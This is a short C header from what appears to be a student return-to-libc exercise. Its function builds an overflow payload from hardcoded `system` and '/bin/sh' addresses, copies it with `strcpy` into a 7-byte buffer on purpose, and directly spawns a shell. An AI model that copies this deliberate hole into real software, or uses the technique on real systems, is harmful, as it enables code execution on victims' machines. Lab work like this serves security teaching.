/*
 * retlib.h
 *
 *  Created on: Nov 9, 2016
 *      Author: student
 */

#ifndef RETLIB_H_
#define RETLIB_H_



void vulnerable_function(){

	char buffer[7];

	char buf[42];
	int i=0;
	while(i<23)
	{
		buf[i] ='A';

		i = i + 1;
	}

	//*(long *)&buf[23] = 0xf7a5b590;//system f7e4f310
	//*(long *)&buf[15] = 0xf7b918c3;//bin/sh f7f6f84c
	*(long *)&buf[23] = 0xf7e4f310;//system
	*(long *)&buf[11] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[03] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[07] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[15] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[19] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[27] = 0xf7f6f84c;///bin/sh
	//*(long *)&buf[15] = 0xf7f6f84c;///bin/sh
	//*(long *)&buf[15] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[31] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[35] = 0xf7f6f84c;///bin/sh
	*(long *)&buf[39] = 0xf7f6f84c;///bin/sh
	//*(long *)&buf[11] = 0xf7b918c3;
	//char a[]="/bin/sh";
	//system(a);
	strcpy(buffer,buf);
	system("/bin/sh");
	//return 0;

}

#endif /* RETLIB_H_ */
